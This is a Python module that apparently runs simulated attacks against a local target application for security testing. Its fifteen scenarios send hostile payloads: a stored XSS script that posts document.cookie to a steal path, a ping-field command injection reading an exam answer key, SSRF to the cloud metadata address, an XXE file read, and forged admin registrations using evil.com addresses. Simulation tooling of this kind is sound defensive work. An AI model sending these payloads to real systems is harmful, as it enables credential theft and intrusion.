import os

import httpx

TARGET_API = os.getenv("BACKEND_URL", "http://localhost:8000") + "/api/v1/target"
TARGET_APP_URL = os.getenv("TARGET_APP_URL", "http://localhost:9000")
BACKEND_URL = os.getenv("BACKEND_URL", "http://localhost:8000")


def _log(sim_id: str, message: str, detail: str = ""):
    try:
        from runner import append_log  # noqa: WPS433
        append_log(sim_id, message, detail)
    except Exception:
        pass


def _post(path: str, sim_id: str = "", **kwargs) -> dict:
    url = f"{TARGET_API}{path}"
    try:
        r = httpx.post(url, timeout=10.0, **kwargs)
        _log(sim_id, f"POST {path}", f"Status: {r.status_code}\n{r.text[:500]}")
        return {"status": r.status_code, "body": r.text[:500]}
    except Exception as exc:
        _log(sim_id, f"POST {path} FAILED", str(exc))
        return {"status": "error", "error": str(exc)}


def _get(path: str, sim_id: str = "", **kwargs) -> dict:
    url = f"{TARGET_API}{path}"
    try:
        r = httpx.get(url, timeout=10.0, **kwargs)
        _log(sim_id, f"GET {path}", f"Status: {r.status_code}\n{r.text[:500]}")
        return {"status": r.status_code, "body": r.text[:500]}
    except Exception as exc:
        _log(sim_id, f"GET {path} FAILED", str(exc))
        return {"status": "error", "error": str(exc)}


def run_broken_auth(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Broken Auth attack", "Credential stuffing against /target/auth/login")
    _post("/auth/login", sim_id, json={"email": "admin_backup", "password": "Winter2024!"})
    return {"scenario": "broken_auth", "status": "sent"}


def run_xss(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Stored XSS attack", "Injecting script into course review")
    _post("/courses/crs_dummy/review", sim_id, json={"content": "<script>fetch('/steal?c='+document.cookie)</script>"})
    return {"scenario": "xss", "status": "sent"}


def run_csrf(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting CSRF attack", "Forged profile update without CSRF token")
    _post("/profile/update", sim_id, json={"email": "attacker@evil.com"})
    return {"scenario": "csrf", "status": "sent"}


def run_idor(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting IDOR attack", "Enumerating student IDs")
    _get("/students/tu_nonexistent_99999", sim_id)
    return {"scenario": "idor", "status": "sent"}


def run_command_injection(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Command Injection", "Ping diagnostic with shell metacharacters")
    _post("/admin/ping", sim_id, json={"host": "127.0.0.1; cat Exam_Answer_Key.pdf"})
    return {"scenario": "command_injection", "status": "sent"}


def run_ssrf(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting SSRF attack", "Fetching internal metadata URL")
    _post("/admin/fetch", sim_id, json={"url": "http://169.254.169.254/latest/meta-data/"})
    return {"scenario": "ssrf", "status": "sent"}


def run_file_upload(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting File Upload attack", "Uploading malicious PHP shell")
    _post("/admin/upload", sim_id)
    return {"scenario": "file_upload", "status": "sent"}


def run_api_abuse(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting API Abuse", "Bulk registration with admin role escalation")
    for i in range(3):
        _post("/api/register-bulk", sim_id, json={"email": f"attacker{i}@evil.com", "role": "admin"})
    _get("/api/data", sim_id, headers={"X-API-Key": "stolen_key"})
    return {"scenario": "api_abuse", "status": "sent"}


def run_session_attack(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Session Attack", "Reusing captured session token")
    _post("/api/session", sim_id, cookies={"session_id": "fixed_session_honeytoken_xyz"})
    return {"scenario": "session_attack", "status": "sent"}


def run_mitm(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting MITM (simulated)", "Suspicious X-Forwarded-For chain")
    _get("/api/secure", sim_id, headers={"X-Forwarded-For": "10.0.0.1, 203.0.113.50"})
    return {"scenario": "mitm", "status": "sent"}


def run_dns_redirect(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting DNS/Redirect attack", "Open redirect to phishing domain")
    _get("/go", sim_id, params={"url": "https://crestwood-login.evil.example.com"})
    return {"scenario": "dns_redirect", "status": "sent"}


def run_deserialization(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Deserialization attack", "Importing malicious settings blob")
    _post("/admin/import-settings", sim_id, content=b"O:8:\"Exploit\":0:{}")
    return {"scenario": "deserialization", "status": "sent"}


def run_xxe(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting XXE attack", "XML external entity in transcript import")
    xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///internal/honeytoken/transcripts">]><root>&xxe;</root>'
    httpx.post(f"{TARGET_API}/admin/import-xml", content=xml, headers={"Content-Type": "application/xml"}, timeout=10.0)
    _log(sim_id, "POST /admin/import-xml", "XXE payload sent")
    return {"scenario": "xxe", "status": "sent"}


def run_cache_poisoning(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Cache Poisoning", "X-Forwarded-Host injection")
    _get("/api/cache", sim_id, headers={"X-Forwarded-Host": "evil.example.com"})
    return {"scenario": "cache_poisoning", "status": "sent"}


def run_supply_chain(target_app_url: str = TARGET_APP_URL, org_id: str = "", sim_id: str = "") -> dict:
    _log(sim_id, "Starting Supply Chain attack", "Malicious package version pull")
    _post("/api/package", sim_id, json={"name": "lodash", "version": "99.0.0-malicious"})
    return {"scenario": "supply_chain", "status": "sent"}


SCENARIOS = {
    "broken_auth": run_broken_auth,
    "xss": run_xss,
    "csrf": run_csrf,
    "idor": run_idor,
    "command_injection": run_command_injection,
    "ssrf": run_ssrf,
    "file_upload": run_file_upload,
    "api_abuse": run_api_abuse,
    "session_attack": run_session_attack,
    "mitm": run_mitm,
    "dns_redirect": run_dns_redirect,
    "deserialization": run_deserialization,
    "xxe": run_xxe,
    "cache_poisoning": run_cache_poisoning,
    "supply_chain": run_supply_chain,
}
